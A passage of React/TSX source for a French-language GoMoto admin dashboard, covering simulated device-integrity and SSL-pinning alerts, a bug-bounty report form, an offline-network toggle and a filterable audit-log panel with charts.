                      {!recPlayIntActive && recPlayIntResult !== "idle" && (
                        <div className="space-y-3 pt-1">
                          <span className="text-[8.5px] text-slate-455 block uppercase tracking-widest font-mono">VERDICT DE L'ATTESTATION :</span>
                          
                          {recPlayIntResult === "passed" && (
                            <div className="bg-emerald-950/55 border border-emerald-500/25 p-3 rounded-xl space-y-1.5">
                              <div className="flex items-center gap-1.5 text-emerald-400 font-bold text-[11px]">
                                <ShieldCheck className="w-4 h-4 text-emerald-400" />
                                <span>CONFORME & SAIN d'ÉTAT</span>
                              </div>
                              <p className="text-[9.5px] text-slate-350 leading-relaxed font-sans">Le périphérique mobile est d'origine d'usine, la localisation actuelle est certifiée authentique et aucune application de spoofing GPS n'a été détectée en mémoire vive.</p>
                            </div>
                          )}

                          {recPlayIntResult === "spoof_warning" && (
                            <div className="bg-amber-955/55 border border-amber-500/25 p-3 rounded-xl space-y-1.5">
                              <div className="flex items-center gap-1.5 text-amber-400 font-bold text-[11px]">
                                <AlertTriangle className="w-4 h-4 text-amber-500 animate-pulse" />
                                <span>ALERTE DE TRICHERIE (MOCK GPS DETECTED)</span>
                              </div>
                              <p className="text-[9.5px] text-slate-350 leading-relaxed font-sans">Le chauffeur utilise un 'Mock Location Provider' pour tricher sur sa file d'attente d'État à Kinshasa. GoMoto a généré une alerte WAF de sécurité d'intégrité et gelé la mise en couple avec le passager.</p>
                            </div>
                          )}

                          {recPlayIntResult === "root_warning" && (
                            <div className="bg-red-955/55 border border-red-500/25 p-3 rounded-xl space-y-1.5">
                              <div className="flex items-center gap-1.5 text-red-400 font-bold text-[11px]">
                                <ShieldAlert className="w-4 h-4 text-red-500 animate-bounce" />
                                <span>PÉRIPHÉRIQUE ALTRUISTE NON SIGNÉ (SYSTEM INTEGRITY FAILED)</span>
                              </div>
                              <p className="text-[9.5px] text-slate-350 leading-relaxed font-sans">Le binaire de l'application est modifié ou tourne sur un firmware piraté sans protection (Root détecté). Retrait de toute attribution de course d'assurance d'État immédiate.</p>
                            </div>
                          )}
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {/* TAB 3: SSL PINNING & CERTIFICATE BLOCK */}
              {activeSandboxTab === "pinning" && (
                <div className="space-y-4 animate-in fade-in duration-200">
                  <div className="flex justify-between items-start gap-4 flex-wrap border-b border-slate-805 pb-3">
                    <div>
                      <h5 className="font-extrabold text-[12px] text-indigo-405 uppercase tracking-widest font-mono">3. CERTIFICATE PINNING SSL & DÉFENSE CONTRE L'INTERCEPTION PROXY</h5>
                      <p className="text-[10px] text-slate-400 font-sans mt-0.5">Évite qu'un attaquant n'écoute et ne modifie les requêtes de crédit en s'interposant entre l'application et les serveurs d'État.</p>
                    </div>
                    <span className="bg-slate-900 border border-slate-800 text-slate-300 font-bold px-2 py-0.5 rounded text-[8.5px] uppercase font-mono font-semibold">Pin : GoMotoRootCA</span>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6 pt-1">
                    <div className="space-y-4">
                      <div className="bg-slate-900 p-3 rounded-xl border border-slate-800 space-y-2">
                        <span className="text-[8.5px] font-mono text-slate-400 block uppercase tracking-widest font-bold">Empreinte Publique Épinglée (Validée d’État) :</span>
                        <code className="text-[9.5px] block font-mono text-[#10B981] break-all bg-slate-950 p-2 rounded border border-slate-850">
                          sha256/m9XvKp+8uU8pD02vJ8n5r/6uGoMotoRootCA2026RDC=
                        </code>
                      </div>

                      <div className="space-y-2">
                        <button
                          type="button"
                          onClick={() => {
                            setRecPinningMitmSimulated(true);
                            setRecPinningStatus("mitm_blocked");
                          }}
                          className="w-full py-2 bg-indigo-600 hover:bg-indigo-700 text-white font-bold text-xs uppercase rounded-xl transition-all shadow-md flex justify-center items-center gap-1.5 cursor-pointer"
                        >
                          <ShieldCheck className="w-3.5 h-3.5" />
                          <span>Simuler une Interception de Trafic par Intrusion Proxy</span>
                        </button>
                        
                        <button
                          type="button"
                          onClick={() => {
                            setRecPinningMitmSimulated(false);
                            setRecPinningStatus("pinned");
                          }}
                          className="w-full py-1 text-center text-[9.5px] text-slate-450 hover:text-slate-300 transition-colors cursor-pointer"
                        >
                          Rétablir le canal crypté normal
                        </button>
                      </div>
                    </div>

                    <div className="bg-slate-900/50 p-4 rounded-xl border border-slate-805 text-xs font-sans leading-relaxed space-y-3">
                      <span className="text-[8.5px] text-slate-455 block uppercase tracking-widest font-mono">ÉTAT DES CONNEXIONS DE FLUX :</span>
                      
                      {recPinningStatus === "pinned" && !recPinningMitmSimulated && (
                        <div className="space-y-3">
                          <div className="flex items-center gap-1.5 text-emerald-400 font-bold">
                            <span className="h-2 w-2 rounded-full bg-emerald-500 animate-ping"></span>
                            <span>CONNEXION SSL DIRECTE DIRECTRICIELLE SÉCURISÉE</span>
                          </div>
                          <div className="bg-slate-955 p-2.5 rounded-lg border border-slate-850 text-[9.5px] font-mono space-y-1 text-slate-350">
                            <p className="text-slate-500">// Header d'authentification valide</p>
                            <p>HTTP/2 200 OK</p>
                            <p>X-GoMoto-Fingerprint-Status: MATCHED</p>
                            <p>Cache-Control: private, max-age=0, encrypted</p>
                          </div>
                        </div>
                      )}

                      {recPinningStatus === "mitm_blocked" && recPinningMitmSimulated && (
                        <div className="space-y-3">
                          <div className="flex items-center gap-1.5 text-red-400 font-bold">
                            <span className="h-2 w-2 rounded-full bg-red-500 animate-pulse"></span>
                            <span>ALERTE WAF : HIJACKING DE CANAL DÉTECTÉ ET BLOQUÉ</span>
                          </div>
                          
                          <p className="text-[9.5px] text-slate-350 font-sans leading-normal font-semibold">
                            Un pare-feu local tente de déchiffrer vos clés SSL privées avec un faux certificat root.
                            L’épinglage strict du certificat d'État a <strong className="text-red-400">immédiatement rompu l’échange</strong> avant transfert d’informations bancaires.
                          </p>

                          <div className="bg-red-955/55 border border-red-500/20 text-red-300 p-2 text-[9px] font-mono rounded">
                            ERROR_SSL_PIN_MISMATCH: Peer public key hash did NOT match GoMoto pinning SHA256! Closing channel immediately.
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {/* TAB 4: BUG BOUNTY ETHICAL PORTAL */}
              {activeSandboxTab === "bounty" && (
                <div className="space-y-4 animate-in fade-in duration-200">
                  <div className="flex justify-between items-start gap-4 flex-wrap border-b border-slate-805 pb-3">
                    <div>
                      <h5 className="font-extrabold text-[12px] text-indigo-405 uppercase tracking-widest font-mono">4. PORTAIL CONGOLAIS CERTBUG-XP (SÉCURITÉ TRANSPARENTE ET PARTENARIAT)</h5>
                      <p className="text-[10px] text-slate-400 font-sans mt-0.5">Encouragez la communauté nationale et internationale à auditer et soumettre des rapports de failles de sécurité éthiquement.</p>
                    </div>
                    <span className="bg-slate-900 border border-slate-800 text-slate-300 font-bold px-2 py-0.5 rounded text-[8.5px] uppercase font-mono font-semibold">Vulnerability Disclosure</span>
                  </div>

                  <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 pt-1">
                    {/* Reporter Form */}
                    <form onSubmit={handleSimulateBounty} className="lg:col-span-1 space-y-3 bg-slate-900/50 p-3.5 border border-slate-800 rounded-xl text-xs leading-none">
                      <span className="text-[9.5px] font-extrabold text-slate-300 block uppercase tracking-wide font-mono">SOUMETTRE UN RAPPORT ÉTHIQUE :</span>
                      
                      <div className="space-y-1">
                        <label className="text-[9px] text-slate-400 font-sans font-bold uppercase block">Analyste / Chercheur Congolais :</label>
                        <input
                          type="text"
                          required
                          value={newBountyReporter}
                          onChange={(e) => setNewBountyReporter(e.target.value)}
                          placeholder="Ex: Joel Kabulo (LualabaSec)"
                          className="w-full bg-slate-950 border border-slate-850 rounded-lg px-2.5 py-1.5 text-xs text-white placeholder-slate-650 outline-none focus:border-indigo-550"
                        />
                      </div>

                      <div className="space-y-1">
                        <label className="text-[9px] text-slate-400 font-sans font-bold uppercase block">Gravité de la faille :</label>
                        <select
                          value={newBountySeverity}
                          onChange={(e: any) => setNewBountySeverity(e.target.value)}
                          className="w-full bg-slate-950 border border-slate-850 rounded-lg px-2.5 py-1.2 text-xs text-white outline-none focus:border-indigo-550"
                        >
                          <option value="low font-semibold text-slate-800">Faible (Low)</option>
                          <option value="medium font-semibold text-slate-800">Moyenne (Medium)</option>
                          <option value="high font-semibold text-slate-800">Haute (High)</option>
                          <option value="critical font-semibold text-slate-800">Critique d’État (Critical)</option>
                        </select>
                      </div>

                      <div className="space-y-1">
                        <label className="text-[9px] text-slate-400 font-sans font-bold uppercase block">Description technique :</label>
                        <textarea
                          rows={2}
                          required
                          value={newBountyDesc}
                          onChange={(e) => setNewBountyDesc(e.target.value)}
                          placeholder="Précisez le endpoint impacté et comment reproduire l'injection..."
                          className="w-full bg-slate-950 border border-slate-850 rounded-lg px-2.5 py-1.5 text-xs text-white placeholder-slate-650 outline-none focus:border-indigo-555 resize-none font-sans"
                        />
                      </div>

                      <button
                        type="submit"
                        className="w-full py-1.5 bg-gradient-to-r from-emerald-600 to-sky-600 text-white font-extrabold text-[9.5px] uppercase rounded-lg transition-all shadow-md cursor-pointer text-center"
                      >
                        ENREGISTRER RAPPORT & ACCORDER PRIME
                      </button>
                    </form>

                    {/* Feed of submitted bounties */}
                    <div className="lg:col-span-2 space-y-3">
                      <span className="text-[9.5px] font-extrabold text-indigo-400 block uppercase tracking-widest font-mono">FLUX DES FAILLES RÉSOLUES & PRÉVENUES (INTEGRITY LOG) :</span>
                      
                      <div className="space-y-2.5 max-h-48 overflow-y-auto pr-1">
                        {recBounties.map((b) => {
                          const isCrit = b.severity === "critical";
                          const isHigh = b.severity === "high";
                          return (
                            <div key={b.id} className="bg-slate-900 border border-slate-800/80 p-3 rounded-xl flex justify-between gap-3 items-start relative overflow-hidden text-left font-sans">
                              <div className="space-y-1">
                                <div className="flex items-center gap-2">
                                  <span className="font-extrabold text-slate-200 text-xs font-sans">{b.reporter}</span>
                                  <span className="text-[8.5px] text-slate-450 font-mono italic">{b.date}</span>
                                  <span className={`px-1.5 py-0.5 rounded text-[8px] font-mono font-bold uppercase ${
                                    isCrit ? "bg-red-950 text-red-400 border border-red-900/40" :
                                    isHigh ? "bg-amber-955 text-amber-400 border border-amber-900/40" :
                                    "bg-slate-800 text-slate-350"
                                  }`}>
                                    {b.severity}
                                  </span>
                                </div>
                                <p className="text-[10px] text-slate-350 leading-snug">{b.desc}</p>
                              </div>

                              <div className="text-right shrink-0">
                                <span className="font-mono text-[11px] font-bold text-emerald-400 block">{b.reward}</span>
                                <span className={`inline-block px-1.5 py-0.5 rounded text-[8px] font-bold uppercase mt-1 ${
                                  b.status === "payé" 
                                    ? "bg-emerald-950 text-emerald-300"
                                    : "bg-indigo-950 text-indigo-300 animate-pulse"
                                }`}>
                                  {b.status}
                                </span>
                              </div>
                            </div>
                          );
                        })}
                        {recBounties.length === 0 && (
                          <div className="text-center text-slate-500 italic font-mono text-[9.5px] py-6">
                            Aucun rapport enregistré actuellement dans le registre local.
                          </div>
                        )}
                      </div>
                    </div>

                  </div>
                </div>
              )}

            </div>
          </div>

          {/* Network Resilience & Embedded IndexedDB Cache dashboard */}
          <div className="border border-slate-200 rounded-3xl p-5 bg-emerald-50/50 space-y-4">
            <div className="flex justify-between items-start gap-4 flex-wrap">
              <div>
                <h4 className="text-xs font-bold text-slate-900 uppercase tracking-widest flex items-center gap-1.5 font-sans">
                  <Database className="w-4 h-4 text-emerald-600" />
                  <span>Réseau Congolais GSM & Simulation de Défaillance</span>
                </h4>
                <p className="text-[10px] text-slate-500 mt-0.5 font-sans">
                  Contrecarrez l'évanescence de la connectivité réseau en RDC avec le moteur asynchrone stock-and-forward d'IndexedDB.
                </p>
              </div>

              <div className="flex gap-2 text-[9px] font-bold font-mono">
                <span className={`px-2 py-0.5 rounded-lg border flex items-center gap-1.5 ${
                  !offlineModeSimulated 
                    ? "bg-emerald-50 text-emerald-700 border-emerald-200" 
                    : "bg-amber-50 text-amber-700 border-amber-200"
                }`}>
                  <span className={`h-1.5 w-1.5 rounded-full ${
                    !offlineModeSimulated ? "bg-emerald-500" : "bg-amber-500 animate-ping"
                  }`}></span>
                  <span>{!offlineModeSimulated ? "RÉSEAU CONGOLAIS ACTIF" : "PANNE GSM SIMULÉE (HORS LIGNE)"}</span>
                </span>
              </div>
            </div>

            <p className="text-[11px] text-slate-650 leading-relaxed font-sans">
              Afin de s'assurer du bon fonctionnement du cache hors-ligne d'IndexedDB pour les motards et clients dans les zones blanches ou de faible connectivité gsm, ce commutateur force l'application globale à basculer virtuellement en mode déconnecté. Cela valide la résilience d'écriture de notre architecture.
            </p>

          </div>
        </div>
      )}

      {/* ================= ADMIN AUDITS TAB: REAL-TIME SURVEILLANCE & INALTERABLE AUDIT TRAIL LOGS ================= */}
      {activeSubTab === "audits" && (() => {
        // Multi-dimensional logs filter (User, Action Type, Specific Calendar Date, Search Text)
        const filteredLogs = localAuditLogs.filter(log => {
          const matchesSearch = logSearchQuery.trim() === "" || 
            (log.details && log.details.toLowerCase().includes(logSearchQuery.toLowerCase())) ||
            (log.adminName && log.adminName.toLowerCase().includes(logSearchQuery.toLowerCase())) ||
            (log.adminEmail && log.adminEmail.toLowerCase().includes(logSearchQuery.toLowerCase())) ||
            (log.targetName && log.targetName.toLowerCase().includes(logSearchQuery.toLowerCase())) ||
            (log.action && log.action.toLowerCase().includes(logSearchQuery.toLowerCase()));
          
          const matchesAction = activeActionFilter === "ALL" || log.action === activeActionFilter;
          
          const matchesUser = activeUserFilter === "ALL" || 
            log.adminEmail === activeUserFilter || 
            log.adminId === activeUserFilter || 
            log.targetId === activeUserFilter || 
            log.targetName === activeUserFilter ||
            log.adminName === activeUserFilter;
            
          const matchesDate = !activeDateFilter || log.timestamp.substring(0, 10) === activeDateFilter;
          
          return matchesSearch && matchesAction && matchesUser && matchesDate;
        });

        // 1. Gather live telemetry metric computations
        const totalLogsMatched = filteredLogs.length;
        const totalCriticalOperations = filteredLogs.filter(l => 
          l.action.includes("DELETE") || 
          l.action.includes("TOGGLE_ADMIN_STATUS") || 
          l.action.includes("FORCE_VALIDATE_ENROLLMENT")
        ).length;

        const uniqueActorsSet = new Set<string>();
        filteredLogs.forEach(l => {
          if (l.adminEmail) uniqueActorsSet.add(l.adminEmail);
        });
        const totalUniqueActors = uniqueActorsSet.size;

        // Extract complete user options list (Registered users + log entities)
        const userOptionsSet = new Set<string>();
        registeredUsers.forEach(u => {
          if (u.email) userOptionsSet.add(u.email);
        });
        localAuditLogs.forEach(l => {
          if (l.adminEmail) userOptionsSet.add(l.adminEmail);
          if (l.adminName) userOptionsSet.add(l.adminName);
          if (l.targetName && l.targetName !== "none") userOptionsSet.add(l.targetName);
        });
        const userOptions = Array.from(userOptionsSet).sort();

        // 2. Action distribution chart data using Recharts
        const actionCountsMap: Record<string, number> = {};
        filteredLogs.forEach(l => {
          actionCountsMap[l.action] = (actionCountsMap[l.action] || 0) + 1;
        });
        const actionChartStats = Object.keys(actionCountsMap).map(action => ({
          name: action.substring(0, 18),
          Occurrences: actionCountsMap[action]
        })).sort((a, b) => b.Occurrences - a.Occurrences);

        // 3. Activity timeline chart data using Recharts
        const timelineCountsMap: Record<string, number> = {};
        // Group by hour if specific day is active, otherwise group by day
        filteredLogs.slice().reverse().forEach(l => {
          try {
            const dateObj = new Date(l.timestamp);
            const label = activeDateFilter 
              ? `${String(dateObj.getHours()).padStart(2, '0')}h` 
              : dateObj.toLocaleDateString("fr-FR", { day: '2-digit', month: '2-digit' });
            timelineCountsMap[label] = (timelineCountsMap[label] || 0) + 1;
          } catch (e) {}
        });
        const timelineChartStats = Object.keys(timelineCountsMap).map(label => ({
          Temps: label,
          Activités: timelineCountsMap[label]
        }));

        return (
          <div className="space-y-6 animate-in fade-in duration-300 text-slate-800 text-left">
            
            {/* Header block */}
            <div className="flex justify-between items-start gap-4 flex-wrap bg-white border border-slate-200 p-5 rounded-3xl">
              <div>
                <h3 className="font-bold text-slate-900 text-sm flex items-center gap-2">
                  <Shield className="w-5 h-5 text-emerald-600 animate-pulse" />
                  <span>Tableau de Bord de Surveillance & d'Audit en Temps Réel (Firestore)</span>
                </h3>
                <p className="text-[10px] text-slate-500 mt-0.5">Surveillance cryptographique continue rattachée au registre inaltérable de la République Démocratique du Congo.</p>
              </div>
              
              <button
                type="button"
                onClick={async () => {
                  setIsLoadingLogs(true);
                  const fetched = await fetchAuditLogs(100);
                  setLocalAuditLogs(fetched);
                  setIsLoadingLogs(false);
                }}
                disabled={isLoadingLogs}
                className="px-3.5 py-1.5 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white font-bold text-xs uppercase tracking-wider flex items-center gap-1.5 shadow-sm cursor-pointer disabled:opacity-50"
              >
                <RefreshCw className={`w-3.5 h-3.5 ${isLoadingLogs ? 'animate-spin' : ''}`} />
                <span>Rafraîchir les Logs</span>
              </button>
            </div>

            {/* LIVE BENTO TELEMETRY HIGHLIGHTS */}
            <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
              
              <div className="bg-slate-900 text-white p-4 rounded-2xl border border-slate-800 shadow-sm relative overflow-hidden flex flex-col justify-between">
                <div>
                  <span className="text-[8px] font-black text-slate-400 uppercase tracking-widest font-mono">STATUT DU SYSTÈME</span>
                  <div className="flex items-center gap-2 mt-1">
                    <span className="w-2 h-2 rounded-full bg-emerald-500 animate-ping" />
                    <span className="text-[11px] font-extrabold text-emerald-400 font-mono">LIVE CLOUD</span>
                  </div>
                </div>
                <p className="text-[9.5px] text-slate-400 font-sans mt-2.5">Écoute continue Firestore active</p>
              </div>

              <div className="bg-white p-4 rounded-2xl border border-slate-200 shadow-sm flex flex-col justify-between">
                <div>
                  <span className="text-[8px] font-black text-slate-450 uppercase tracking-widest font-mono">ÉVÉNEMENTS FILTRÉS</span>
                  <span className="text-xl font-mono font-black text-slate-900 block mt-1">{totalLogsMatched} logs</span>
                </div>
                <p className="text-[9.5px] text-slate-500 font-sans mt-2.5">Tracés sous critères actifs</p>
              </div>

              <div className="bg-white p-4 rounded-2xl border border-slate-200 shadow-sm flex flex-col justify-between">
                <div>
                  <span className="text-[8px] font-black text-[#dc2626] uppercase tracking-widest font-mono">ALERTE CRITIQUES</span>
                  <span className="text-xl font-mono font-black text-red-600 block mt-1">{totalCriticalOperations} alertes</span>
                </div>
                <p className="text-[9.5px] text-red-500 font-bold font-sans mt-2.5">Actions modérateurs sensibles</p>
              </div>

              <div className="bg-white p-4 rounded-2xl border border-slate-200 shadow-sm flex flex-col justify-between">
                <div>
                  <span className="text-[8px] font-black text-slate-450 uppercase tracking-widest font-mono">ADMINISTRATEURS ACTEURS</span>
                  <span className="text-xl font-mono font-black text-indigo-700 block mt-1">{totalUniqueActors} admins</span>
                </div>
                <p className="text-[9.5px] text-slate-500 font-sans mt-2.5">Signataires de modifications</p>
              </div>
            </div>

            {/* DUAL SURVEILLANCE CHARTS (RECHARTS) */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              
              {/* Chart 1: Activity timeline */}
              <div className="bg-white border border-slate-200 p-5 rounded-3xl shadow-sm space-y-3">
                <div>
                  <h4 className="font-extrabold text-slate-900 text-xs uppercase tracking-wider">Chronologie d'activité du Registre</h4>
                  <p className="text-[9.5px] text-slate-500">Flux d'actions consolidées par temps dans le périmètre filtré</p>
                </div>
                
                <div className="w-full h-48 bg-slate-50 rounded-xl p-2 border border-slate-100 flex items-center justify-center">
                  {timelineChartStats.length === 0 ? (
                    <span className="text-[10px] text-slate-400 italic">Données de chronologie insuffisantes</span>
                  ) : (
                    <ResponsiveContainer width="100%" height="100%">
                      <AreaChart data={timelineChartStats} margin={{ top: 5, right: 10, left: -25, bottom: 5 }}>
                        <defs>
                          <linearGradient id="colorActivites" x1="0" y1="0" x2="0" y2="1">
                            <stop offset="5%" stopColor="#10B981" stopOpacity={0.2}/>
                            <stop offset="95%" stopColor="#10B981" stopOpacity={0}/>
                          </linearGradient>
                        </defs>
                        <CartesianGrid strokeDasharray="3 3" vertical={false} stroke="#f1f5f9" />
                        <XAxis dataKey="Temps" stroke="#94a3b8" fontSize={9} tickLine={false} />
                        <YAxis stroke="#94a3b8" fontSize={9} width={30} tickLine={false} />
                        <Tooltip />
                        <Area type="monotone" dataKey="Activités" stroke="#10B981" strokeWidth={1.5} fillOpacity={1} fill="url(#colorActivites)" />
                      </AreaChart>
                    </ResponsiveContainer>
                  )}
                </div>
              </div>

              {/* Chart 2: Action distribution */}
              <div className="bg-white border border-slate-200 p-5 rounded-3xl shadow-sm space-y-3">
                <div>
                  <h4 className="font-extrabold text-slate-900 text-xs uppercase tracking-wider">Distribution des Typologies d'Action</h4>
                  <p className="text-[9.5px] text-slate-500">Nombre d'occurrences par catégorie administrative</p>
                </div>
                
                <div className="w-full h-48 bg-slate-50 rounded-xl p-2 border border-slate-100 flex items-center justify-center">
                  {actionChartStats.length === 0 ? (
                    <span className="text-[10px] text-slate-400 italic">Aucune action enregistrée sous ces filtres</span>
                  ) : (
                    <ResponsiveContainer width="100%" height="100%">
                      <BarChart data={actionChartStats} margin={{ top: 5, right: 5, left: -25, bottom: 5 }}>
                        <CartesianGrid strokeDasharray="3 3" vertical={false} stroke="#f1f5f9" />
                        <XAxis dataKey="name" stroke="#94a3b8" fontSize={8} tickLine={false} />
                        <YAxis stroke="#94a3b8" fontSize={9} width={30} tickLine={false} />
                        <Tooltip />
                        <Bar dataKey="Occurrences" fill="#6366f1" radius={[4, 4, 0, 0]}>
                          {actionChartStats.map((entry, index) => (
                            <Cell key={`cell-${index}`} fill={index % 2 === 0 ? "#6366f1" : "#8b5cf6"} />
                          ))}
                        </Bar>
                      </BarChart>
                    </ResponsiveContainer>
                  )}
                </div>
              </div>
            </div>

            {/* THREE-WAY CENTRAL MULTI-FILTERING PANEL */}
            <div className="bg-white border border-slate-200 p-5 rounded-3xl shadow-sm space-y-4">
              <span className="font-bold text-slate-900 text-xs uppercase tracking-wider block border-b border-slate-100 pb-2">🎯 Panneau Avancé de Traçabilité</span>
              
              <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                
                {/* Search query input */}
                <div className="space-y-1 text-left">
                  <label className="text-[10px] uppercase tracking-wider font-extrabold text-slate-400 block">Recherche générale</label>
                  <div className="relative">
                    <Search className="absolute left-3 top-2.5 w-3.5 h-3.5 text-slate-400" />
                    <input
                      type="text"
                      placeholder="Identifiant, cible, détails..."
                      value={logSearchQuery}
                      onChange={(e) => setLogSearchQuery(e.target.value)}
                      className="w-full pl-8 pr-3 py-1.5 text-xs bg-slate-50 border border-slate-200 rounded-xl focus:outline-none focus:ring-1 focus:ring-emerald-500 font-sans text-slate-700"
                    />
                  </div>
                </div>

                {/* Filter by Action Type */}
                <div className="space-y-1 text-left">
                  <label className="text-[10px] uppercase tracking-wider font-extrabold text-slate-400 block">Filtrer par Action</label>
                  <select
                    value={activeActionFilter}
                    onChange={(e) => setActiveActionFilter(e.target.value)}
                    className="w-full bg-slate-50 border border-slate-200 p-1.5 rounded-xl text-xs font-bold text-slate-750 focus:outline-none focus:ring-1 focus:ring-emerald-500"
                  >
                    <option value="ALL">Toutes les actions ({localAuditLogs.length})</option>
                    <option value="TOGGLE_ADMIN_STATUS">TOGGLE_ADMIN_STATUS (Sécurité)</option>
                    <option value="REVIEW_WITHDRAWAL">REVIEW_WITHDRAWAL (Finances)</option>
                    <option value="DISPATCH_BRIGADE">DISPATCH_BRIGADE (SOS Sécuritaire)</option>
                    <option value="REVIEW_FLEET_DOC">REVIEW_FLEET_DOC (Validation)</option>
                    <option value="FORCE_VALIDATE_ENROLLMENT">FORCE_VALIDATE_ENROLLMENT (Souverain)</option>
                    <option value="SAVE_EDIT_USER">SAVE_EDIT_USER (Registre)</option>
                    <option value="CREATE_USER">CREATE_USER (Enrôlement)</option>
                    <option value="DELETE_USER">DELETE_USER (Radiation)</option>
                    <option value="REVIEW_TAX_DOCUMENT">REVIEW_TAX_DOCUMENT (Fiscalité)</option>
                    <option value="RESOLVE_SOS_ALERT">RESOLVE_SOS_ALERT (SOS)</option>
                    <option value="WALLET_RECHARGE">WALLET_RECHARGE (Portefeuille)</option>
                    <option value="ESCROW_RELEASE">ESCROW_RELEASE (Escrow REPARO)</option>
                  </select>
                </div>

                {/* Filter by User (Admin or targets) */}
                <div className="space-y-1 text-left">
                  <label className="text-[10px] uppercase tracking-wider font-extrabold text-slate-400 block">Filtrer par Utilisateur</label>
                  <select
                    value={activeUserFilter}
                    onChange={(e) => setActiveUserFilter(e.target.value)}
                    className="w-full bg-slate-50 border border-slate-200 p-1.5 rounded-xl text-xs font-bold text-slate-750 focus:outline-none focus:ring-1 focus:ring-emerald-500"
                  >
                    <option value="ALL">Tous les utilisateurs ({userOptions.length})</option>
                    {userOptions.map(user => (
                      <option key={user} value={user}>{user}</option>
                    ))}
                  </select>
                </div>

                {/* Filter by Calendar Date */}
                <div className="space-y-1 text-left">
                  <label className="text-[10px] uppercase tracking-wider font-extrabold text-slate-400 block">Filtrer par Date</label>
                  <div className="flex gap-1">
                    <input
                      type="date"
                      value={activeDateFilter}
                      onChange={(e) => setActiveDateFilter(e.target.value)}
                      className="flex-1 bg-slate-50 border border-slate-200 p-1 rounded-xl text-xs font-bold text-slate-700 focus:outline-none focus:ring-1 focus:ring-emerald-500 cursor-pointer font-sans"
                    />
                    
                    {activeDateFilter ? (
                      <button
                        type="button"
                        onClick={() => setActiveDateFilter("")}
                        className="px-2 py-1 bg-red-100 hover:bg-red-200 text-red-700 text-[10px] rounded-lg font-black transition-all cursor-pointer font-sans"
                        title="Effacer la date"
                      >
                        X
                      </button>
                    ) : (
                      <button
                        type="button"
                        onClick={() => setActiveDateFilter(new Date().toISOString().substring(0, 10))}
                        className="px-2 py-1 bg-slate-100 hover:bg-slate-200 text-slate-700 text-[9px] rounded-lg font-bold transition-all cursor-pointer font-sans"
                        title="Sélectionner aujourd'hui"
                      >
                        Aujourd'hui
                      </button>
                    )}
                  </div>
                </div>

              </div>
            </div>

            {/* TWO-COLUMN RESULTS: STREAMS & DETAILS */}
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              
              {/* Inalterability warning notice */}
              <div className="lg:col-span-1">
                <div className="bg-slate-900 border border-slate-800 p-5 rounded-3xl text-white space-y-3">
                  <div className="flex items-center gap-2">
                    <ShieldCheck className="w-5 h-5 text-emerald-400" />
                    <span className="font-bold text-xs uppercase tracking-wider">État d'Intégrité d'État</span>
                  </div>
                  <div className="h-0.5 bg-slate-800"></div>
                  <div className="space-y-2 text-[11px] text-slate-300 font-sans">
                    <p className="flex justify-between"><span className="text-slate-405">Politique Firestore:</span> <span className="text-emerald-400 font-mono font-bold">ACTIF (Rules lvl 2)</span></p>
                    <p className="flex justify-between"><span className="text-slate-405">Mutabilité:</span> <span className="text-red-400 font-mono font-bold">STRICTEMENT VERROUILLÉE</span></p>
                    <p className="flex justify-between"><span className="text-slate-405">Mode Écriture Seule:</span> <span className="text-emerald-400 font-mono font-bold">CONFORME</span></p>
                    <p className="flex justify-between"><span className="text-slate-405">Flux d'écoute:</span> <span className="text-white font-mono font-bold">Surveillance de {localAuditLogs.length} logs</span></p>
                  </div>
                  
                  <div className="text-[9px] bg-emerald-950/65 text-emerald-300 p-2.5 rounded-xl leading-relaxed border border-emerald-900/40">
                    ⚠️ **Sécurisation de l'audit trail :** Les règles de sécurité de la base de données cloudFirestore (`allow update, delete: if false;`) bloquent définitivement toute suppression, réécriture ou modification rétroactive, garantissant une conformité inattaquable.
                  </div>
                </div>
              </div>

              {/* Logs Stream List (Replaced plain list with our stream list) */}
              <div className="lg:col-span-2 space-y-4">
                <div className="bg-white border border-slate-200 rounded-3xl shadow-sm overflow-hidden flex flex-col h-[525px]">
                  
                  {/* List Header */}
                  <div className="bg-slate-50 border-b border-slate-200 px-4 py-3 flex justify-between items-center text-xs">
                    <span className="font-bold text-slate-700">Flux d'événements surveillés en direct ({filteredLogs.length})</span>
                    <span className="font-mono text-[9px] text-slate-500 animate-pulse flex items-center gap-1">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-500" />
                      Abonnement en temps réel
                    </span>
                  </div>

                  {/* List Body */}
                  <div className="flex-1 overflow-y-auto divide-y divide-slate-100">
                    {isLoadingLogs ? (
                      <div className="p-8 text-center text-xs text-slate-500 flex flex-col items-center justify-center gap-2 h-full font-sans">
                        <RefreshCw className="w-6 h-6 text-emerald-600 animate-spin" />
                        <span>Flotage des logs d'audit d'État en direct...</span>
                      </div>
                    ) : filteredLogs.length === 0 ? (
                      <div className="p-8 text-center text-xs text-slate-400 flex flex-col items-center justify-center h-full space-y-1 font-sans">
                        <FileText className="w-8 h-8 text-slate-300 mb-2" />
                        <p className="font-bold">Aucun événement de log correspondant.</p>
                        <p className="text-[10px]">Modifiez les critères ci-dessus ou effectuez une action d'administration pour la consigner.</p>
                      </div>
                    ) : (
                      filteredLogs.map((log) => {
                        const isSelected = selectedLog?.id === log.id;
                        return (
                          <div
                            key={log.id}
                            onClick={() => setSelectedLog(log)}
                            className={`p-3.5 hover:bg-slate-50/50 transition-colors pointer-events-auto cursor-pointer border-l-4 text-xs select-none font-sans ${
                              isSelected ? "bg-slate-50 border-emerald-500 font-medium" : "border-transparent"
                            }`}
                          >
                            <div className="flex justify-between items-start gap-1.5 flex-wrap">
                              <span className={`px-2 py-0.5 rounded text-[8.5px] font-mono font-bold uppercase ${
                                log.action.includes("DELETE") ? "bg-red-150 text-red-800 border border-red-200" :
                                log.action.includes("CREATE") ? "bg-emerald-100 text-emerald-800 border border-emerald-200" :
                                log.action.includes("ESCROW") || log.action.includes("WALLET") ? "bg-blue-105 text-blue-800 border border-blue-200" : "bg-purple-105 text-purple-800 border border-purple-200"
                              }`}>
                                {log.action}
                              </span>
                              <span className="text-slate-400 text-[9.5px] font-mono shrink-0">
